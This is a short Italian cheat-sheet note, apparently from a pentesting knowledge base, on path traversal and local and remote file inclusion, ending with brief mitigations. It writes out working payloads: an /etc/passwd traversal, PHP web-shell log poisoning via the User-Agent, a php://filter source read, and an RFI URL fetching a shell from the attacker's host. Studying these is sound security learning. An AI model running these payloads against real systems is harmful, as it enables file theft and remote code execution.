Leggi file fuori dalla cartella prevista risalendo l'albero.
```
	http://URL?file=../../../etc/passwd
```

## LFI (Local File Inclusion)

L'app include (non solo legge) un file locale -> potenziale RCE.
- Log poisoning: inietti PHP nello User-Agent, poi includi i file di log:
```
	https://URL?page=../../../../var/log/apache2/access.log&cmd=id  
```
- Prima fai una richiesta con User-Agent: ```<?php system($_GET['cmd']) ?>```,  poi includi il log -> il PHP nel log viene eseguito;
- PHP Wrappers:
```
	php://filter/convert.base64-encode/resource=index.php base64
```

## RFI (Remote File Inclusion)

L'app include un URL remoto (```allow_url_include=On```):
```
	http://URL?page=http;//LHOST/shell.txt
```
- Ospiti tu shell.txt con dentro PHP; il target lo include ed esegue. Raro nelle config moderne.

### Mitigazione

Allowlist dei file inclusi, ```basename()```, niente input utente nei path, ```allow_url_include=Off```, chroot/jail.

---

Vedi anche: [[Insecure File Upload]] · [[Command Injection]]
